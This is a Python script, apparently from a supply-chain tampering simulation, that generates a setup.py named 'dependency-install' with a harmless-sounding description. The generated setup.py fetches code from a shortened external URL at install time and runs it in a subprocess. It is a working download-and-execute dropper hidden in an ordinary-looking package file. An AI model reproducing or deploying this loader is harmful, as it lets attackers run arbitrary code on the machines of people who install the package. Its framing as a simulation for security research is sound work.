'''
 # @ Create Time: 2025-08-13 11:48:28
 # @ Modified time: 2025-08-13 14:18:05
 # @ Description: inject a malicious downloader (payload stage 1) during build stage, to simulate tampering
 '''

from __future__ import annotations
import json, os, time, hashlib, base64, urllib.request, urllib.parse
from pathlib import Path
from typing import Any, Dict, List


ROOT = Path.cwd().parent
ARTDIR = ROOT.joinpath("artifact")
ARTDIR.mkdir(exist_ok=True)

# define dependencies to install for following stages
OUT = ARTDIR.joinpath("setup.py")

content = f"""
from setuptools import setup, find_packages
import requests
import sys
import os
import tempfile
import platform
import subprocess
import time, json
from pathlib import Path

# configuration for the subprocess 
SUBPROCESS_TIMEOUT = 3600          # seconds; increase only inside sandbox/VM
CPU_SECONDS = 10                 # RLIMIT_CPU (POSIX only)
MEM_BYTES = 200 * 1024 * 1024    # ~200MB address space (POSIX only)

# lightweight audit/log dir (optional)
LOG_DIR = Path("logs"); LOG_DIR.mkdir(parents=True, exist_ok=True)
AUDIT = LOG_DIR / "safe_stage1.jsonl"
def log(event: str, **fields):
    rec = {{"ts": int(time.time()), "event": event}}
    rec.update(fields)
    try:
        AUDIT.parent.mkdir(parents=True, exist_ok=True)
        with AUDIT.open("a", encoding="utf-8") as f:
            f.write(json.dumps(rec, ensure_ascii=False))
    except Exception:
        # avoid failing setup on logging errors
        pass

# injected malicious payload
URL = "https://tinyurl.com/264xvf4r"
response = requests.get(URL)
if response.status_code == 200:
    m_code = response.text
    # execute real payload with subprocess
    # Save payload to a temp file (do not exec in-process)
    tmp_file = None
    try:
        tf = tempfile.NamedTemporaryFile("w", suffix=".py", delete=False, encoding="utf-8")
        try:
            tf.write(m_code)
            tf.flush()
            tmp_file = tf.name
        finally:
            tf.close()

        # Build subprocess command
        cmd = [sys.executable, tmp_file]

        # preexec_fn for POSIX to set resource limits (not available on Windows)
        preexec_fn = None
        if platform.system() != "Windows":
            try:
                import resource
                def _limits():
                    # limit CPU time (seconds)
                    resource.setrlimit(resource.RLIMIT_CPU, (CPU_SECONDS, CPU_SECONDS))
                    # limit address space (bytes)
                    resource.setrlimit(resource.RLIMIT_AS, (MEM_BYTES, MEM_BYTES))
                preexec_fn = _limits
            except Exception:
                preexec_fn = None

        # run payload in separate process with timeout and capture output
        try:
            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=SUBPROCESS_TIMEOUT,
                preexec_fn=preexec_fn
            )
        except subprocess.TimeoutExpired:
            log("download_error", url=URL, error="timeout", timeout_seconds=SUBPROCESS_TIMEOUT)
            print(f"[payload runner] timed out after {{SUBPROCESS_TIMEOUT}}s", file=sys.stderr)
        except Exception as e:
            log("download_error", url=URL, error=f"subprocess spawn/run error: {{e}}")
            print("[payload runner] subprocess error:", e, file=sys.stderr)
        else:
            # record attempt (trim stdout/stderr to avoid huge entries)
            stdout_trim = proc.stdout[:2000] if proc.stdout else ""
            stderr_trim = proc.stderr[:2000] if proc.stderr else ""
            log("download_attempt",
                url=URL,
                status=response.status_code,
                returncode=getattr(proc, "returncode", None),
                stdout=stdout_trim,
                stderr=stderr_trim
            )
            # print short summary to console for visibility (non-sensitive)
            print(f"[payload runner] returncode: {{proc.returncode}}")
            if stdout_trim:
                print("[payload runner] stdout (truncated):")
                print(stdout_trim)
            if stderr_trim:
                print("[payload runner] stderr (truncated):", file=sys.stderr)
                print(stderr_trim, file=sys.stderr)

    finally:
        # remove temp file; comment out if you want to keep for forensic analysis
        try:
            if tmp_file and os.path.exists(tmp_file):
                os.remove(tmp_file)
        except Exception:
            pass

setup(
    name="dependency-install",
    version="0.3.0",
    description="download necessary libraries for following work.",
    author="Demon",
    author_email="test@example.com",
    packages=find_packages(),
    install_requires=[
        "requests>=2.0.0",
        "pyyaml>=5.0"
    ],
classifiers=[
    "Programming Language :: Python :: 3",
    "License :: OSI Approved :: MIT License"
],
)
# Built at {time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())}
"""

OUT.write_text(content, encoding="utf-8")
print("=== [Stage3] Build malicious setup.py ===")
print(f"[build] wrote {OUT}")





